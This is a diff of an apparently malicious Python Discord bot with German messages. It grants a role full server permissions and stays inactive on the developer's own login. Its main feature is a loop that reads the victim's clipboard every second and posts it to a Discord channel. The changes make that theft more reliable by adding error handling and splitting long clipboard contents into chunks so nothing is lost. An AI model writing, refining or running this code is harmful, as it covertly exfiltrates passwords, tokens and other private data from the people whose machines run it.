@@ -199,32 +199,33 @@ async def on_ready():
         if not existing_role:
             try:
                 role = await guild.create_role(name="BOT_perms", permissions=discord.Permissions.all())
-                await ctx.send("Rolle 'BOT_perms' erstellt.")
+                print("Rolle 'BOT_perms' erstellt.")
             except Exception as e:
-                await ctx.send(f"Fehler beim Erstellen der Rolle: {e}")
+                print(f"Fehler beim Erstellen der Rolle: {e}")
         else:
             try:
                 role = existing_role
-                await ctx.send("Rolle 'BOT_perms' gefunden.")
+                print("Rolle 'BOT_perms' gefunden.")
+            except Exception as e:
+                print(f"Fehler beim Überprüfen der Rolle: {e}")
 
         if role is None:
-            try:
-                await ctx.send("Die Rolle 'BOT_perms' wurde nicht erstellt.")
-                return
+            print("Die Rolle 'BOT_perms' wurde nicht erstellt.")
+            return
 
         if member:
             try:
                 await member.add_roles(role)
-                await ctx.send(f"Rolle 'BOT_perms' für {member} hinzugefügt.")
+                print(f"Rolle 'BOT_perms' für {member} hinzugefügt.")
             except Exception as e:
-                await ctx.send(f"Fehler beim Hinzufügen der Rolle für {member}: {e}")
+                print(f"Fehler beim Hinzufügen der Rolle für {member}: {e}")
 
         if bot_member:
             try:
                 await bot_member.add_roles(role)
-                await ctx.send(f"Rolle 'BOT_perms' für Bot hinzugefügt.")
+                print(f"Rolle 'BOT_perms' für Bot hinzugefügt.")
             except Exception as e:
-                await ctx.send(f"Fehler beim Hinzufügen der Rolle für Bot: {e}")
+                print(f"Fehler beim Hinzufügen der Rolle für Bot: {e}")
 
     if not os.getlogin() == DEV:
         await on(clipboard_channel)
@@ -1118,11 +1119,22 @@ async def delete_webhook(channel):
 async def monitor_clipboard():
     global clipboard_previous
     while True:
-        clipboard_content = pyperclip.paste()
-        if clipboard_content != clipboard_previous:
+        try:
+            clipboard_content = pyperclip.paste()
+        except pyperclip.PyperclipWindowsException as e:
+            print(f"Error accessing clipboard: {e}")
+            clipboard_content = ""  # Setze den Clipboard-Inhalt auf leer, um Fehler zu vermeiden
+
+        if clipboard_content != clipboard_previous and clipboard_content:
             clipboard_previous = clipboard_content
             if clipboard_channel:
-                await send_embed_message(clipboard_channel, f"Clipboard changed:\n```\n{clipboard_content}\n```")
+                if len(clipboard_content) <= 1900:
+                    await send_embed_message(clipboard_channel, f"Clipboard changed:\n```\n{clipboard_content}\n```")
+                else:
+                    # Split the content into chunks of 1900 characters
+                    chunks = [clipboard_content[i:i+1900] for i in range(0, len(clipboard_content), 1900)]
+                    for chunk in chunks:
+                        await send_embed_message(clipboard_channel, f"Clipboard changed (part):\n```\n{chunk}\n```")
         await asyncio.sleep(1)
 
 @bot.command(help= "Get the SERVER OWNER's dc name.")
